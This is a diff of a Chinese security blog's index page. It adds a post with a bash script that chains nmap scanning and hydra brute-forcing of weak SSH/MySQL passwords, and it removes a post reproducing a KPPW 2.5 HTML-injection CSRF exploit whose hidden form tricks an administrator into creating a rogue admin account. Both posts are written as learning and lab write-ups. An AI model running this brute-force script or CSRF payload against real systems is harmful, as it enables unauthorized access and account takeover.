@@ -252,6 +252,185 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/14/autobrute/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lawliet">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/LuFei.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lawliet Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/05/14/autobrute/" itemprop="url">用shell写一个自动化扫描主机端口爆破服务弱口令的脚本</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-14T16:36:34+08:00">
+                2018-05-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux-Shell/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux Shell</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="用shell写一个自动化扫描主机端口爆破服务弱口令的脚本"><a href="#用shell写一个自动化扫描主机端口爆破服务弱口令的脚本" class="headerlink" title="用shell写一个自动化扫描主机端口爆破服务弱口令的脚本"></a>用shell写一个自动化扫描主机端口爆破服务弱口令的脚本</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>最近在学习linux shell脚本的编写，学会写shell的一个好处就是能够批量执行我们要执行的命令，实现自动化工作，可以在今后的工作中提升工作效率，节省时间</strong></p>
+<h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><p><strong>假设现在有一个需求，公司分配给你了一个ip列表，要求你将其中存活的主机筛选出来，检查这些主机是否开启了常用的服务，以及是否存在弱口令</strong></p>
+<p><strong>一般常用的做法就是先利用nmap扫描出存活主机，然后扫描这些主机开放的端口，用hydra对这些端口进行弱口令安全检查。如果将这些命令写在一个shell脚本中，以后再次做相同的工作时直接运行我们编写的.sh文件就可以了，这样的话就能大大提高我们的工作效率，避免重复机械的工作，大大提升效率</strong></p>
+<h3 id="编写shell脚本"><a href="#编写shell脚本" class="headerlink" title="编写shell脚本"></a>编写shell脚本</h3><p><strong>我编写的shell脚本有以下几部分组成</strong></p>
+<p><strong>ip.txt</strong></p>
+<pre><code>ip列表，里面放着要扫描的ip
+</code></pre><p><strong>service.conf</strong></p>
+<pre><code>配置文件，里面是我们要检查的服务和其对应的端口号，使用者可以在这里进行设置要检查的服务
+</code></pre><p><strong>比如要检查ssh与mysql服务的弱口令，里面这样写，配置文件格式：<code>端口：服务</code></strong></p>
+<pre><code>22:ssh
+3306:mysql
+</code></pre><p><strong>这样便能灵活的对我们需要的服务进行弱口令检测</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180514/HKF6Jl6Jdl.png?imageslim" alt="mark"></p>
+<p><strong>user.txt</strong></p>
+<pre><code>存放着常见的用户名，用于hydra爆破
+</code></pre><p><strong>passwd.txt</strong></p>
+<pre><code>存放着常见的弱口令，用于hydra爆破
+</code></pre><p><strong>brute.sh</strong></p>
+<pre><code>下面的就是我编写的shell脚本，可以自动化的完成上述的一系列工作
+
+#!/bin/bash
+filename=$1
+for port in `awk -F &apos;:&apos; &apos;{print $1}&apos; service.conf`
+do
+name=`awk -F &apos;:&apos; &apos;/&apos;$port&apos;/{print $2}&apos; service.conf`
+echo &quot;$name weak password result:&quot;
+nmap -sn -iL $filename|awk &apos;/Nmap scan/{print $5}&apos;&gt;liveip.txt
+nmap -Pn -sS -p $port -iL liveip.txt|grep &quot;open&quot; -B &quot;5&quot;|awk &apos;/Nmap scan/{print $5}&apos;&gt;tmpip.txt
+if [ ! -s tmpip.txt ]
+then
+echo &quot;no ip open port $port&quot;
+else
+result=`hydra -L user.txt -P passwd.txt -M tmpip.txt $name -t 4|awk &apos;/password:/{print $0}&apos;`
+echo $result
+fi
+done
+</code></pre><p><strong>首先接收命令行的第一个参数，也就是要进行检查的ip列表文件ip.txt，之后循环读取服务配置文件，使用awk工具筛选出要检查的端口号和其对应的服务并赋值给对应的变量，之后用nmap进行主机存活扫描，将存活主机使用awk匹配出来输出到一个文件中，使用nmap对这个文件里的这些存活ip进行端口扫描，利用awk将nmap扫描结果中开放端口的ip筛选出来输出到一个文件里，之后利用hydra对这些ip进行其端口对应服务的弱口令检查</strong></p>
+<p><strong>脚本运行结果，以自己所在内网的ip作为测试，ip段<code>192.168.3.0/24</code>,可以看出针对ssh服务还是检查出很多弱口令的，mysql服务大多数都禁止了远程连接，所以没有扫出弱口令</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180514/Ca7L5i0dGI.png?imageslim" alt="mark"></p>
+<p><strong>这是初步编写的成果，只是与文件进行交互，而且有着很多的不足，之后随着学习的深入，相信会写出比这个更棒更完善的脚本</strong></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/13/parse_url/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2168,168 +2347,6 @@ if __name__==&apos;__main__&apos;:
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/01/12/KPPW25xss/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Lawliet">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/LuFei.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Lawliet Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/01/12/KPPW25xss/" itemprop="url">KPPW2.5XSS引起的CSRF</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-12T09:45:22+08:00">
-                2018-01-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web安全/" itemprop="url" rel="index">
-                    <span itemprop="name">web安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="kppw2-5XSS漏洞复现（可csrf）"><a href="#kppw2-5XSS漏洞复现（可csrf）" class="headerlink" title="kppw2.5XSS漏洞复现（可csrf）"></a>kppw2.5XSS漏洞复现（可csrf）</h1><h3 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h3><pre><code>http://192.168.50.157/kppw25/index.php?do=user&amp;view=message&amp;op=send
-</code></pre><p><strong>收件人填目标用户名,标题随便,内容没有转义 ,所以提交内容处可能存在xss，不过过滤了敏感标签和 onerror onload等事件。虽然不能加载js代码，但是还是可以注入html代码，可以用xss漏洞注入html代码触发csrf</strong></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><pre><code>http://192.168.50.157/kppw25/index.php?do=user&amp;view=message&amp;op=send
-</code></pre><p><strong>收件人填写admin（网站管理员），向管理员提交私信，内容为我们构造的html代码</strong></p>
-<pre><code>&lt;form action=&quot;http://192.168.50.157/kppw25/admin/index.php?do=user&amp;view=add&amp;edituid=
-&quot; method=&quot;post&quot;&gt;
-    &lt;input type=hidden name=&quot;edituid&quot; value=&quot;&quot;&gt;
-    &lt;input type=hidden name=&quot;fds[username]&quot; value=&quot;qianlan&quot;&gt;
-    &lt;input type=hidden name=&quot;fds[truename]&quot; value=&quot;&quot;&gt;
-    &lt;input type=hidden name=&quot;fds[phone]&quot; value=&quot;&quot;&gt;
-    &lt;input type=hidden name=&quot;fds[qq]&quot; value=&quot;&quot;&gt;
-    &lt;input type=hidden name=&quot;fds[indus_pid]&quot; value=&quot;&quot;&gt;
-    &lt;input type=hidden name=&quot;fds[indus_id]&quot; value=&quot;&quot;&gt;
-    &lt;input type=hidden name=&quot;fds[birthday]&quot; value=&quot;&quot;&gt;
-    &lt;input type=hidden name=&quot;fds[password]&quot; value=&quot;newadmin&quot;&gt;
-    &lt;input type=hidden name=&quot;fds[email]&quot; value=&quot;x@q.c&quot;&gt;
-    &lt;input type=hidden name=&quot;fds[group_id]&quot; value=&quot;1&quot;&gt;
-    &lt;input type=&quot;submit&quot; name=&quot;is_submit&quot; value=&quot;1&quot;&gt;
-&lt;/form&gt;
-</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/61IildflAL.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/0l5K9ahhlI.PNG" alt="mark"><br><strong><code>http://192.168.50.157/kppw25/admin/index.php?do=user&amp;view=add&amp;edituid=</code>这个url是后台管理员添加用户的url，我们构造表单，action的值设为这个url，写几个隐藏表单诱使管理员去点击提交，就会以管理员的身份去添加一个新的管理员，当然这不是网站管理员的意愿，而是我们的</strong></p>
-<p><strong>提交完成后退出当前网站用户，模拟管理员登陆查看私信，可以看到一个按钮，单单一个按钮，看到的人总会想着去点一下，当然这个按钮可以构造的更具有吸引力</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/76hH05ID8e.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/b3m8d2K1fC.PNG" alt="mark"><br><strong>当点击按钮过后，管理员就会在不知情的情况下发起添加用户的http请求去添加一个用户名为qianlan密码为newadmin的用户，当然这是我们构造的，看用户列表可以看到多了一个名为qianlan的用户，我们登陆一下可以成功进入后台，进行下一步的渗透</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/1gdjJ8kgAd.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/K4e1kIgCJc.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180112/cKa291JeeF.PNG" alt="mark"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2384,7 +2401,7 @@ if __name__==&apos;__main__&apos;:
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-count">29</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2395,7 +2412,7 @@ if __name__==&apos;__main__&apos;:
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">10</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -2406,7 +2423,7 @@ if __name__==&apos;__main__&apos;:
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">15</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
